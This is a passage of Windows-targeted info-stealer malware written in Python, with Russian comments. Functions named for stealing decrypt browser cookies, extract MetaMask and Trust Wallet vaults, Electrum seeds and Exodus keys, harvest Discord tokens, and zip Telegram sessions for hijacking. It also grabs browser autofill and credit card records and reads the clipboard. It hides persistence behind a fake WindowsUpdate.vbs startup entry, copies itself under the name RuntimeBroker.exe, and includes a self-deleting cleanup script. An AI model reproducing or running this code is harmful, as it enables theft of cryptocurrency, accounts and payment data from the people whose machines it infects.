                    try:
                        shutil.copy2(db_path, temp_db)
                    except:
                        continue

                    _TempFileTracker.add(temp_db)

                    conn = None
                    try:
                        conn = sqlite3.connect(temp_db)
                        cursor = conn.cursor()

                        cursor.execute("""
                            SELECT host_key, name, encrypted_value, path, expires_utc
                            FROM cookies
                            WHERE encrypted_value != ''
                        """)

                        for row in cursor.fetchall():
                            try:
                                host = row[0]
                                name = row[1]
                                encrypted_value = row[2]
                                path = row[3]

                                value = decrypt_password(encrypted_value, key)

                                if value:
                                    cookies.append({
                                        "browser": browser_name,
                                        "host": host,
                                        "name": name,
                                        "value": value,
                                        "path": path,
                                    })
                            except:
                                continue

                    except:
                        pass
                    finally:
                        if conn:
                            try:
                                conn.close()
                            except:
                                pass
                    
                    _TempFileTracker.remove(temp_db)
                        
                except:
                    continue
                    
        except:
            continue
    
    return cookies


# ═══════════════════════════════════════════════════════════════════
# CRYPTO WALLET STEALER
# ═══════════════════════════════════════════════════════════════════

def steal_metamask_data():
    """
    Извлекает данные MetaMask из браузеров.
    
    Правильные пути хранения:
    - Chrome/Edge/Brave: LOCALAPPDATA + User Data + Default + Local Extension Storage + leveldb
    
    Что можно получить:
    - Зашифрованный vault (требует пароль для расшифровки)
    - Адреса аккаунтов
    - preferences (сети, настройки)
    """
    import re
    
    wallets_found = []
    
    # Правильные пути к данным MetaMask
    metamask_paths = {
        'Chrome': os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Google', 'Chrome', 'User Data'),
        'Chrome_Beta': os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Google', 'Chrome Beta', 'User Data'),
        'Chrome_SxS': os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Google', 'Chrome SxS', 'User Data'),
        'Edge': os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Microsoft', 'Edge', 'User Data'),
        'Brave': os.path.join(os.environ.get('LOCALAPPDATA', ''), 'BraveSoftware', 'Brave-Browser', 'User Data'),
        'Opera': os.path.join(os.environ.get('APPDATA', ''), 'Opera Software', 'Opera Stable'),
        'Vivaldi': os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Vivaldi', 'User Data'),
        'Yandex': os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Yandex', 'YandexBrowser', 'User Data'),
    }
    
    # Extension ID MetaMask
    metamask_id = 'nkbihfceogfjnklpgfcmpldnjadgkhbp'
    
    for browser_name, user_data_path in metamask_paths.items():
        try:
            if not os.path.exists(user_data_path):
                continue
            
            # Ищем во всех профилях (Default, Profile 1, Profile 2, etc.)
            profiles = ['Default']
            for i in range(1, 10):
                profile_name = f'Profile {i}'
                if os.path.exists(os.path.join(user_data_path, profile_name)):
                    profiles.append(profile_name)
            
            for profile in profiles:
                # Правильный путь к Local Extension Storage
                ext_storage = os.path.join(
                    user_data_path, 
                    profile, 
                    'Local Extension Storage', 
                    metamask_id,
                    'leveldb'
                )
                
                if not os.path.exists(ext_storage):
                    continue
                
                wallet_data = {
                    'browser': browser_name,
                    'profile': profile,
                    'vault': None,
                    'preferences': None,
                    'accounts': [],
                    'raw_data': {}
                }
                
                # Читаем все .log и .ldb файлы
                for filename in os.listdir(ext_storage):
                    if not filename.endswith(('.log', '.ldb')):
                        continue
                        
                    file_path = os.path.join(ext_storage, filename)
                    try:
                        with open(file_path, 'rb') as f:
                            content = f.read()
                            
                            # Ищем vault с более умным regex
                            vault_patterns = [
                                rb'"vault"\s*:\s*"(.*?)"',
                                rb'"vault"\s*:\s*\{(.*?)\}',
                            ]
                            
                            for pattern in vault_patterns:
                                vault_match = re.search(pattern, content, re.DOTALL)
                                if vault_match:
                                    wallet_data['vault'] = vault_match.group(1).decode('utf-8', errors='ignore')
                                    break
                            
                            # Ищем preferences
                            if b'"preferences"' in content:
                                pref_match = re.search(rb'"preferences"\s*:\s*"([^"]+)"', content)
                                if pref_match:
                                    try:
                                        wallet_data['preferences'] = json.loads(
                                            pref_match.group(1).decode('utf-8', errors='ignore')
                                        )
                                    except:
                                        wallet_data['preferences'] = pref_match.group(1).decode('utf-8', errors='ignore')
                            
                            # Ищем адреса аккаунтов (0x...)
                            address_matches = re.findall(rb'0x[a-fA-F0-9]{40}', content)
                            if address_matches:
                                addresses = list(set([m.decode('utf-8') for m in address_matches]))
                                wallet_data['accounts'].extend(addresses)
                                wallet_data['accounts'] = list(set(wallet_data['accounts']))
                            
                            # Сохраняем сырые данные для анализа
                            if any(k in content for k in [b'identities', b'KeyringController', b'preferences']):
                                wallet_data['raw_data'][filename] = True
                                
                    except:
                        pass
                
                # Добавляем если нашли хоть что-то
                if wallet_data['vault'] or wallet_data['preferences'] or wallet_data['accounts']:
                    # Удаляем accounts если дубликаты
                    wallet_data['accounts'] = list(set(wallet_data['accounts']))[:10]
                    wallets_found.append(wallet_data)
                
        except Exception as e:
            pass
    
    return wallets_found


def steal_trust_wallet_data():
    r"""
    Извлекает данные Trust Wallet Desktop.
    
    Пути хранения:
    - %APPDATA%\Trust Wallet\
    - %LOCALAPPDATA%\Trust Wallet\
    """
    import re
    
    wallets_found = []
    
    trust_paths = {
        'TrustWallet_Desktop': os.path.join(os.environ.get('APPDATA', ''), 'Trust Wallet'),
        'TrustWallet_Local': os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Trust Wallet'),
    }
    
    # Также проверяем как расширение в браузерах (Trust Wallet Extension ID: egjidjbpglichlcondbcbdnbfapdphfa)
    trust_ext_id = 'egjidjbpglichlcondbcbdnbfapdphfa'
    
    browser_paths = {
        'Chrome': os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Google', 'Chrome', 'User Data'),
        'Edge': os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Microsoft', 'Edge', 'User Data'),
        'Brave': os.path.join(os.environ.get('LOCALAPPDATA', ''), 'BraveSoftware', 'Brave-Browser', 'User Data'),
    }
    
    # Проверяем десктопную версию
    for wallet_name, base_path in trust_paths.items():
        try:
            if not os.path.exists(base_path):
                continue
            
            # Ищем важные файлы
            important_files = [
                'wallet.json',
                'wallet.dat',
                'config.json',
                'preferences.json',
                'keystore',
            ]
            
            wallet_info = {
                'type': wallet_name,
                'found_files': [],
                'has_wallet_file': False,
                'encrypted': True
            }
            
            for root, dirs, files in os.walk(base_path):
                for file in files:
                    if file in important_files or file.endswith('.json') or file.endswith('.dat'):
                        file_path = os.path.join(root, file)
                        wallet_info['found_files'].append({
                            'name': file,
                            'path': file_path,
                            'size': os.path.getsize(file_path)
                        })
                        
                        if file in ['wallet.json', 'wallet.dat']:
                            wallet_info['has_wallet_file'] = True
                            # Пробуем прочитать
                            try:
                                with open(file_path, 'r', encoding='utf-8') as f:
                                    data = json.load(f)
                                    # Проверяем есть ли приватные ключи
                                    if any(k in data for k in ['privateKey', 'private_key', 'seed', 'mnemonic']):
                                        wallet_info['encrypted'] = False
                                        wallet_info['data'] = data
                            except:
                                pass
            
            if wallet_info['found_files']:
                wallets_found.append(wallet_info)
                
        except Exception:
            pass
    
    # Проверяем как браузерное расширение
    for browser_name, user_data_path in browser_paths.items():
        try:
            if not os.path.exists(user_data_path):
                continue
            
            profiles = ['Default']
            for i in range(1, 5):
                if os.path.exists(os.path.join(user_data_path, f'Profile {i}')):
                    profiles.append(f'Profile {i}')
            
            for profile in profiles:
                ext_storage = os.path.join(
                    user_data_path,
                    profile,
                    'Local Extension Storage',
                    trust_ext_id,
                    'leveldb'
                )
                
                if not os.path.exists(ext_storage):
                    continue
                
                wallet_info = {
                    'type': f'TrustWallet ({browser_name} - {profile})',
                    'vault': None,
                    'accounts': [],
                    'raw_data': {}
                }
                
                for filename in os.listdir(ext_storage):
                    if not filename.endswith(('.log', '.ldb')):
                        continue
                    
                    file_path = os.path.join(ext_storage, filename)
                    try:
                        with open(file_path, 'rb') as f:
                            content = f.read()
                            
                            # Ищем vault
                            vault_match = re.search(rb'"vault"\s*:\s*"(.*?)"', content, re.DOTALL)
                            if vault_match:
                                wallet_info['vault'] = vault_match.group(1).decode('utf-8', errors='ignore')
                            
                            # Ищем адреса
                            addresses = re.findall(rb'0x[a-fA-F0-9]{40}', content)
                            if addresses:
                                wallet_info['accounts'].extend(list(set([a.decode('utf-8') for a in addresses])))
                    except:
                        pass
                
                if wallet_info['vault'] or wallet_info['accounts']:
                    wallet_info['accounts'] = list(set(wallet_info['accounts']))[:10]
                    wallets_found.append(wallet_info)
                    
        except Exception:
            pass
    
    return wallets_found


def steal_electrum_wallets():
    """
    Извлекает файлы кошельков Electrum.
    
    Что можно получить:
    - Файлы кошельков (могут быть зашифрованы паролем)
    - config файл с настройками
    - История транзакций
    """
    wallets = []
    
    electrum_path = os.path.join(os.environ.get('APPDATA', ''), 'Electrum', 'wallets')
    
    if not os.path.exists(electrum_path):
        return wallets
    
    try:
        for filename in os.listdir(electrum_path):
            wallet_file = os.path.join(electrum_path, filename)
            if os.path.isfile(wallet_file):
                try:
                    with open(wallet_file, 'r', encoding='utf-8') as f:
                        wallet_data = json.load(f)
                        
                        wallet_info = {
                            'filename': filename,
                            'wallet_type': wallet_data.get('wallet_type', 'unknown'),
                            'seed_version': wallet_data.get('seed_version', 'unknown'),
                            'has_seed': 'seed' in wallet_data,
                            'has_xpub': 'xpub' in wallet_data or 'xpubs' in wallet_data,
                            'has_keystore': 'keystore' in wallet_data,
                            'encrypted': wallet_data.get('seed', '').startswith('encrypted:') if 'seed' in wallet_data else True
                        }
                        
                        # Если seed не зашифрован — извлекаем
                        if 'seed' in wallet_data and not wallet_data['seed'].startswith('encrypted:'):
                            wallet_info['seed'] = wallet_data['seed']
                        
                        # Извлекаем keystore данные
                        if 'keystore' in wallet_data:
                            ks = wallet_data['keystore']
                            wallet_info['keystore'] = {
                                'type': ks.get('type', 'unknown'),
                                'has_xpub': 'xpub' in ks,
                                'has_key': 'key' in ks or 'privkey' in ks
                            }
                        
                        wallets.append(wallet_info)
                except:
                    # Если не JSON — просто сохраняем имя файла
                    wallets.append({'filename': filename, 'size': os.path.getsize(wallet_file)})
    except Exception:
        pass
    
    return wallets


def steal_exodus_data():
    """
    Извлекает данные Exodus wallet.
    
    Что можно получить:
    - Зашифрованные приватные ключи
    - backup файлы
    - config и настройки
    """
    exodus_data_found = {}
    
    exodus_path = os.path.join(os.environ.get('APPDATA', ''), 'exodus')
    
    if not os.path.exists(exodus_path):
        return exodus_data_found
    
    try:
        # Ищем важные файлы
        important_files = [
            'exodus.key',
            'exodus.backup',
        ]
        
        for filename in important_files:
            filepath = os.path.join(exodus_path, filename)
            if os.path.exists(filepath):
                try:
                    with open(filepath, 'rb') as f:
                        content = f.read()
                        exodus_data_found[filename] = {
                            'size': len(content),
                            'data': base64.b64encode(content).decode('utf-8')
                        }
                except:
                    pass
        
        # Читаем config
        config_path = os.path.join(exodus_path, 'config.json')
        if os.path.exists(config_path):
            with open(config_path, 'r', encoding='utf-8') as f:
                exodus_data_found['config'] = json.load(f)
    except Exception:
        pass
    
    return exodus_data_found


def steal_discord_tokens():
    """
    Извлекает Discord токены (полезно так как пользователи часто хранят seed phrases в сообщениях).
    
    Что можно получить:
    - Discord token
    - Local storage данные
    - Сообщения (через API с токеном)
    """
    tokens = []
    
    discord_paths = {
        'Discord': os.path.join(os.environ.get('APPDATA', ''), 'Discord'),
        'DiscordCanary': os.path.join(os.environ.get('APPDATA', ''), 'discordcanary'),
        'DiscordPTB': os.path.join(os.environ.get('APPDATA', ''), 'discordptb'),
        'DiscordDevelopment': os.path.join(os.environ.get('APPDATA', ''), 'discorddevelopment'),
    }
    
    for name, path in discord_paths.items():
        try:
            token_path = os.path.join(path, 'Local Storage', 'leveldb')
            if not os.path.exists(token_path):
                continue
            
            token_pattern = re.compile(r'[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27,}')
            
            for filename in os.listdir(token_path):
                if filename.endswith(('.log', '.ldb')):
                    try:
                        with open(os.path.join(token_path, filename), 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                            found_tokens = token_pattern.findall(content)
                            if found_tokens:
                                tokens.extend(found_tokens)
                    except:
                        pass
        except Exception:
            pass
    
    return list(set(tokens))


def steal_telegram_sessions():
    """
    Извлекает информацию о Telegram сессиях.

    Что можно получить:
    - Сессию tdata (можно импортировать в другой клиент)
    - Список аккаунтов
    """
    sessions = []

    telegram_path = os.path.join(os.environ.get('APPDATA', ''), 'Telegram Desktop', 'tdata')

    if not os.path.exists(telegram_path):
        return sessions

    try:
        # Проверяем наличие сессий
        for filename in os.listdir(telegram_path):
            if filename.startswith('key_data') or filename.endswith('.s'):
                filepath = os.path.join(telegram_path, filename)
                sessions.append({
                    'filename': filename,
                    'size': os.path.getsize(filepath),
                    'path': filepath
                })
    except Exception:
        pass

    return sessions


def extract_telegram_account():
    """
    Извлекает подробную информацию о Telegram Desktop аккаунте.

    Собирает:
    - Наличие установленного Telegram Desktop
    - Структуру папки tdata (ключевые файлы сессий)
    - DcOption (ID дата-центра, если доступен)
    - Список аккаунтов (по файлам ключей)
    - Размер сессионных данных
    - Файлы миниатюр и кэша
    - Копирует tdata для импорта в другой клиент
    """
    result = {
        'installed': False,
        'tdata_path': None,
        'accounts': [],
        'session_files': [],
        'key_files': [],
        'cache_files': [],
        'total_size_bytes': 0,
        'total_size_human': '0 B',
        'dc_info': None,
        'can_export': False,
        'export_path': None,
        'errors': []
    }

    if platform.system() != "Windows":
        result['errors'].append('Windows only')
        return result

    telegram_path = os.path.join(os.environ.get('APPDATA', ''), 'Telegram Desktop', 'tdata')

    if not os.path.exists(telegram_path):
        return result

    result['installed'] = True
    result['tdata_path'] = telegram_path

    try:
        all_files = os.listdir(telegram_path)
    except Exception as e:
        result['errors'].append(f'Cannot list tdata: {e}')
        return result

    # Категоризация файлов
    key_patterns = ['key_data', 'D877F783D5D3EF8C', 'D877F783D5D3EF8C.map', 'D877F783D5D3EF8Cs']
    session_extensions = ('.s', '.ts')
    cache_dirs = ['emoji', 'stickers', 'thumbnails', 'user_data', 'photo']

    total_size = 0

    for filename in all_files:
        filepath = os.path.join(telegram_path, filename)

        try:
            fsize = os.path.getsize(filepath) if os.path.isfile(filepath) else 0
        except Exception:
            fsize = 0

        total_size += fsize

        # Ключевые файлы аутентификации
        if filename in key_patterns or filename.startswith('key_data'):
            result['key_files'].append({
                'filename': filename,
                'size': fsize,
                'path': filepath,
                'modified': datetime.fromtimestamp(os.path.getmtime(filepath), tz=timezone.utc).isoformat() if os.path.isfile(filepath) else None
            })

        # Файлы сессий
        elif filename.endswith(session_extensions):
            account_name = filename.replace('.s', '').replace('.ts', '')
            result['session_files'].append({
                'filename': filename,
                'account': account_name,
                'size': fsize,
                'path': filepath,
                'modified': datetime.fromtimestamp(os.path.getmtime(filepath), tz=timezone.utc).isoformat() if os.path.isfile(filepath) else None
            })
            result['accounts'].append({
                'identifier': account_name,
                'session_file': filename,
                'size': fsize,
                'status': 'active' if fsize > 0 else 'empty'
            })

        # Кэш и миниатюры
        elif filename in cache_dirs and os.path.isdir(filepath):
            try:
                cache_size = sum(
                    os.path.getsize(os.path.join(filepath, f))
                    for f in os.listdir(filepath)
                    if os.path.isfile(os.path.join(filepath, f))
                )
            except Exception:
                cache_size = 0

            result['cache_files'].append({
                'directory': filename,
                'size': cache_size,
                'path': filepath
            })

        # Прочие файлы tdata
        elif os.path.isfile(filepath):
            result['session_files'].append({
                'filename': filename,
                'size': fsize,
                'path': filepath,
                'modified': datetime.fromtimestamp(os.path.getmtime(filepath), tz=timezone.utc).isoformat() if os.path.isfile(filepath) else None
            })

    # Общий размер
    result['total_size_bytes'] = total_size
    result['total_size_human'] = _human_readable_size(total_size)

    # Дата-центр (ищем в файлах map)
    dc_info = _extract_telegram_dc_info(telegram_path)
    if dc_info:
        result['dc_info'] = dc_info

    # Проверка возможности экспорта
    has_keys = len(result['key_files']) > 0
    has_sessions = len(result['session_files']) > 0
    result['can_export'] = has_keys and has_sessions

    # Создаём копию tdata для экспорта
    if result['can_export']:
        export_path = _export_telegram_tdata(telegram_path)
        result['export_path'] = export_path

    return result


def _extract_telegram_dc_info(telegram_path):
    """
    Пытается извлечь информацию о дата-центре из tdata.
    Telegram Desktop хранит информацию о DC в конфигурационных файлах.
    """
    dc_info = {}

    # Файлы которые могут содержать DC info
    config_candidates = ['D877F783D5D3EF8C', 'D877F783D5D3EF8C.map', 'user_data']

    for filename in config_candidates:
        filepath = os.path.join(telegram_path, filename)
        if not os.path.exists(filepath):
            continue

        try:
            with open(filepath, 'rb') as f:
                content = f.read()

            # Ищем паттерны DC (числа 1-5, которые встречаются в контексте)
            # Telegram использует DC ID 1-5
            for dc_id in range(1, 6):
                dc_pattern = f'dc{dc_id}'.encode()
                if dc_pattern in content.lower():
                    dc_info['detected_dc'] = dc_id
                    break

            # Ищем IP-адреса серверов
            ip_pattern = re.compile(r'\b(?:\d{1,3}\.){3}\d{1,3}\b')
            ips = ip_pattern.findall(content.decode('utf-8', errors='ignore'))
            if ips:
                dc_info['server_ips'] = list(set(ips))[:5]

            if dc_info:
                break

        except Exception:
            continue

    return dc_info if dc_info else None


def _export_telegram_tdata(telegram_path):
    """
    Создаёт ZIP-копию tdata для импорта в другой Telegram Desktop клиент.
    Возвращает путь к ZIP файлу или None при ошибке.
    """
    try:
        _log_to_file(f"[Telegram Export] Starting export from: {telegram_path}")

        export_dir = os.path.join(os.environ.get('TEMP', ''), 'tg_export')
        os.makedirs(export_dir, exist_ok=True)
        _log_to_file(f"[Telegram Export] Export directory: {export_dir}")

        timestamp = datetime.now(timezone.utc).strftime('%Y%m%d_%H%M%S')
        zip_name = f'tgram_tdata_{timestamp}.zip'
        zip_path = os.path.join(export_dir, zip_name)

        file_count = 0
        total_size = 0
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
            for root, dirs, files in os.walk(telegram_path):
                for file in files:
                    try:
                        file_path = os.path.join(root, file)
                        arcname = os.path.relpath(file_path, os.path.dirname(telegram_path))
                        zf.write(file_path, arcname)
                        file_count += 1
                        total_size += os.path.getsize(file_path)
                    except Exception as e:
                        _log_to_file(f"[Telegram Export] Warning: Could not add {file}: {e}")

        _log_to_file(f"[Telegram Export] Created ZIP: {zip_path} ({file_count} files, {_human_readable_size(total_size)})")

        try:
            _TempFileTracker.add(zip_path)
        except Exception as e:
            _log_to_file(f"[Telegram Export] Warning: Could not track temp file: {e}")

        return zip_path

    except Exception as e:
        _log_to_file(f"[Telegram Export] CRITICAL ERROR: {e}")
        import traceback
        _log_to_file(f"[Telegram Export] Traceback: {traceback.format_exc()}")
        return None


def _human_readable_size(size_bytes):
    """Конвертирует байты в читаемый формат."""
    if size_bytes == 0:
        return '0 B'

    units = ['B', 'KB', 'MB', 'GB', 'TB']
    unit_index = 0

    size = float(size_bytes)
    while size >= 1024.0 and unit_index < len(units) - 1:
        size /= 1024.0
        unit_index += 1

    return f'{size:.2f} {units[unit_index]}'


# ═══════════════════════════════════════════════════════════════════
# CLIPBOARD MONITOR
# ═══════════════════════════════════════════════════════════════════

def get_clipboard_content():
    """Получает текущее содержимое буфера обмена через Win32 API (без tkinter)."""
    try:
        import ctypes
        
        # Win32 API constants
        CF_TEXT = 1
        CF_UNICODETEXT = 13
        
        user32 = ctypes.windll.user32
        
        # Открываем clipboard
        if not user32.OpenClipboard(0):
            return None
        
        try:
            # Сначала пробуем Unicode текст
            if user32.IsClipboardFormatAvailable(CF_UNICODETEXT):
                handle = user32.GetClipboardData(CF_UNICODETEXT)
                if handle:
                    # Блокируем и получаем данные
                    p_text = ctypes.windll.kernel32.GlobalLock(handle)
                    if p_text:
                        text = ctypes.c_wchar_p(p_text).value
                        ctypes.windll.kernel32.GlobalUnlock(handle)
                        return text.strip() if text else None
            elif user32.IsClipboardFormatAvailable(CF_TEXT):
                handle = user32.GetClipboardData(CF_TEXT)
                if handle:
                    p_text = ctypes.windll.kernel32.GlobalLock(handle)
                    if p_text:
                        text = ctypes.c_char_p(p_text).value
                        ctypes.windll.kernel32.GlobalUnlock(handle)
                        return text.decode('utf-8', errors='ignore').strip() if text else None
        finally:
            user32.CloseClipboard()
            
    except Exception:
        return None



def steal_browser_autofill():
    """
    Извлекает данные автозаполнения браузеров (кредитные карты, адреса, телефоны).
    """
    autofill_data = []
    
    browsers = {
        'Chrome': os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Google', 'Chrome', 'User Data', 'Default'),
        'Edge': os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Microsoft', 'Edge', 'User Data', 'Default'),
    }
    
    for browser, profile_path in browsers.items():
        try:
            webdata_path = os.path.join(profile_path, 'Web Data')
            if not os.path.exists(webdata_path):
                continue
            
            # Копируем в temp для чтения
            temp_db = os.path.join(os.environ.get('TEMP', ''), f'webdata_{os.getpid()}.db')
            shutil.copy2(webdata_path, temp_db)
            _TempFileTracker.add(temp_db)

            conn = None
            try:
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()

                # Autofill profiles
                cursor.execute("SELECT * FROM autofill_profiles")
                profiles = cursor.fetchall()

                if profiles:
                    autofill_data.append({
                        'browser': browser,
                        'profiles': [str(p) for p in profiles[:10]]  # Ограничиваем
                    })

                # Credit cards
                cursor.execute("SELECT * FROM credit_cards")
                cards = cursor.fetchall()

                if cards:
                    autofill_data.append({
                        'browser': browser,
                        'credit_cards': [str(c) for c in cards[:10]]
                    })

            except Exception:
                pass
            finally:
                if conn:
                    try:
                        conn.close()
                    except:
                        pass
        except Exception:
            pass
    
    return autofill_data


def steal_all_crypto_data():
    """
    Комплексная функция для кражи всех доступных криптоданных.
    Собирает всё в один отчёт.
    """
    report = {
        'timestamp': datetime.now(timezone.utc).isoformat(),
        'hostname': socket.gethostname(),
        'user': os.getenv('USERNAME'),
        'wallets': {}
    }
    
    # MetaMask
    metamask = steal_metamask_data()
    if metamask:
        report['wallets']['metamask'] = metamask
        _log_to_file(f"[Crypto] MetaMask found: {len(metamask)} browser(s)")
    else:
        _log_to_file("[Crypto] MetaMask not found")
    
    # Trust Wallet
    trust_wallet = steal_trust_wallet_data()
    if trust_wallet:
        report['wallets']['trust_wallet'] = trust_wallet
        _log_to_file(f"[Crypto] Trust Wallet found: {len(trust_wallet)} instance(s)")
    else:
        _log_to_file("[Crypto] Trust Wallet not found")
    
    # Electrum
    electrum = steal_electrum_wallets()
    if electrum:
        report['wallets']['electrum'] = electrum
        _log_to_file(f"[Crypto] Electrum found: {len(electrum)} wallet(s)")
    
    # Exodus
    exodus = steal_exodus_data()
    if exodus:
        report['wallets']['exodus'] = exodus
        _log_to_file("[Crypto] Exodus found")
    
    # Discord tokens
    discord_tokens = steal_discord_tokens()
    if discord_tokens:
        report['wallets']['discord_tokens'] = discord_tokens
        _log_to_file(f"[Crypto] Discord tokens found: {len(discord_tokens)}")
    
    # Telegram sessions
    telegram = steal_telegram_sessions()
    if telegram:
        report['wallets']['telegram_sessions'] = telegram
        _log_to_file(f"[Crypto] Telegram sessions found: {len(telegram)}")

    # Telegram Desktop account
    telegram_account = extract_telegram_account()
    if telegram_account['installed']:
        report['wallets']['telegram_account'] = {
            'tdata_path': telegram_account['tdata_path'],
            'accounts': telegram_account['accounts'],
            'key_files_count': len(telegram_account['key_files']),
            'session_files_count': len(telegram_account['session_files']),
            'total_size': telegram_account['total_size_human'],
            'dc_info': telegram_account['dc_info'],
            'can_export': telegram_account['can_export'],
            'export_path': telegram_account['export_path']
        }
        _log_to_file(f"[Crypto] Telegram Desktop account found: {len(telegram_account['accounts'])} session(s), {telegram_account['total_size_human']}")
    
    # Browser autofill
    autofill = steal_browser_autofill()
    if autofill:
        report['wallets']['browser_autofill'] = autofill
        _log_to_file("[Crypto] Browser autofill found")
    
    total_found = sum(len(v) if isinstance(v, list) else 1 for v in report['wallets'].values())
    _log_to_file(f"[Crypto] Total wallet types found: {total_found}")
    
    return report


def get_local_ip():
    """Получение локального IP адреса."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


def collect_system_info():
    """Собирает информацию о системе."""
    info = {
        "hostname": socket.gethostname(),
        "user": os.getenv("USERNAME"),
        "executable_path": get_executable_path() if platform.system() == "Windows" else os.path.abspath(__file__),
        "is_compiled": getattr(sys, 'frozen', False),
        "os": {"platform": platform.platform()},
        "network": {"local_ip": socket.gethostbyname(socket.gethostname())}
    }
    return info


def enable_autostart():
    """Добавляет агент в автозагрузку Windows (скрытно)."""
    if platform.system() != "Windows":
        return json.dumps({"error": "Windows only"})

    try:
        # Получаем путь к папке автозагрузки (не видно в диспетчере задач)
        startup_folder = os.path.join(os.environ['APPDATA'],
                                     r'Microsoft\Windows\Start Menu\Programs\Startup')

        # Получаем путь к текущему скрипту
        script_path = os.path.abspath(__file__)

        # Создаем VBS скрипт для скрытого запуска
        vbs_path = os.path.join(startup_folder, 'WindowsUpdate.vbs')

        with open(vbs_path, 'w') as f:
            f.write('Set WshShell = CreateObject("WScript.Shell")\n')
            f.write(f'WshShell.Run "pythonw.exe ""{script_path}""", 0, False\n')

        # Скрываем файл
        import ctypes
        FILE_ATTRIBUTE_HIDDEN = 0x02
        ctypes.windll.kernel32.SetFileAttributesW(vbs_path, FILE_ATTRIBUTE_HIDDEN)

        _log_to_file(f"[AUTOSTART] Added to startup folder: {vbs_path}")
        return json.dumps({"status": "enabled", "path": vbs_path})
    except Exception as e:
        _log_to_file(f"[AUTOSTART] Error: {str(e)}")
        return json.dumps({"error": str(e)})


def disable_autostart():
    """Удаляет агент из автозагрузки Windows."""
    if platform.system() != "Windows":
        return json.dumps({"error": "Windows only"})

    try:
        # Удаляем VBS файл из папки автозагрузки
        startup_folder = os.path.join(os.environ['APPDATA'],
                                     r'Microsoft\Windows\Start Menu\Programs\Startup')
        vbs_path = os.path.join(startup_folder, 'WindowsUpdate.vbs')

        if os.path.exists(vbs_path):
            # Снимаем атрибут "скрытый" перед удалением
            import ctypes
            ctypes.windll.kernel32.SetFileAttributesW(vbs_path, 0x80)  # FILE_ATTRIBUTE_NORMAL
            os.remove(vbs_path)

        _log_to_file("[AUTOSTART] Removed from startup")
        return json.dumps({"status": "disabled"})
    except Exception as e:
        _log_to_file(f"[AUTOSTART] Error: {str(e)}")
        return json.dumps({"error": str(e)})


def check_autostart():
    """Проверяет статус автозагрузки."""
    if platform.system() != "Windows":
        return json.dumps({"error": "Windows only"})

    try:
        startup_folder = os.path.join(os.environ['APPDATA'],
                                     r'Microsoft\Windows\Start Menu\Programs\Startup')
        vbs_path = os.path.join(startup_folder, 'WindowsUpdate.vbs')

        if os.path.exists(vbs_path):
            return json.dumps({"status": "enabled", "path": vbs_path})
        else:
            return json.dumps({"status": "disabled"})
    except Exception as e:
        return json.dumps({"error": str(e)})


def uninstall_agent():
    """Удаляет агент с компьютера (удаляет из автозагрузки и сам файл)."""
    if platform.system() != "Windows":
        return json.dumps({"error": "Windows only"})

    try:
        # Сначала удаляем из автозагрузки
        disable_autostart()

        # Получаем путь к текущему exe (не __file__!)
        script_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)

        # Пути к возможным копиям
        system_dir = os.path.join(os.environ.get('WINDIR', 'C:\\Windows'), 'System32')
        system_copy = os.path.join(system_dir, 'RuntimeBroker.exe')
        appdata_copy = os.path.join(os.environ.get('APPDATA'), 'Microsoft', 'Windows', 'RuntimeBroker.exe')

        # Создаем bat файл для самоудаления
        bat_path = os.path.join(os.environ['TEMP'], 'cleanup.bat')
        exe_name = os.path.basename(script_path)
        log_path = os.path.join(os.environ['TEMP'], 'uninstall_log.txt')

        with open(bat_path, 'w') as f:
            f.write('@echo off\n')
            f.write(f'echo Starting uninstall at %time% > "{log_path}"\n')
            f.write(f'echo Target path: {script_path} >> "{log_path}"\n')
            f.write('timeout /t 2 /nobreak > nul\n')
            f.write(f'echo Killing process {exe_name} >> "{log_path}"\n')
            # Убиваем процесс принудительно несколько раз
            f.write(f'taskkill /F /IM "{exe_name}" >nul 2>&1\n')
            f.write('timeout /t 2 >nul\n')
            f.write(f'taskkill /F /IM "{exe_name}" >nul 2>&1\n')
            # Ждём чтобы Windows освободил файл
            f.write(f'echo Waiting 10 seconds >> "{log_path}"\n')
            f.write('timeout /t 10 /nobreak > nul\n')
            # Удаляем из реестра
            f.write(f'echo Deleting registry >> "{log_path}"\n')
            f.write('reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v RuntimeBroker /f >nul 2>&1\n')
            # Пробуем удалить через PowerShell с принудительным снятием атрибутов
            f.write(f'echo Attempting PowerShell delete >> "{log_path}"\n')
            f.write(f'powershell -Command "if (Test-Path \\"{script_path}\\") {{ Remove-Item -Path \\"{script_path}\\" -Force -ErrorAction SilentlyContinue }}" >nul 2>&1\n')
            # Удаляем основной файл через cmd (пробуем много раз)
            f.write(f'echo Deleting main exe: {script_path} >> "{log_path}"\n')
            f.write(f'set attempts=0\n')
            f.write(f':retry1\n')
            f.write(f'set /a attempts+=1\n')
            f.write(f'attrib -r -s -h "{script_path}" >nul 2>&1\n')
            f.write(f'del /f /q "{script_path}" >nul 2>&1\n')
            f.write(f'if exist "{script_path}" (\n')
            f.write(f'  if %attempts% LSS 10 (\n')
            f.write(f'    echo Attempt %attempts% failed, retrying >> "{log_path}"\n')
            f.write(f'    timeout /t 3 /nobreak >nul\n')
            f.write(f'    goto retry1\n')
            f.write(f'  ) else (\n')
            f.write(f'    echo Failed to delete after 10 attempts >> "{log_path}"\n')
            f.write(f'  )\n')
            f.write(f') else (\n')
            f.write(f'  echo Main exe deleted successfully >> "{log_path}"\n')
            f.write(f')\n')
            # Удаляем копию из System32
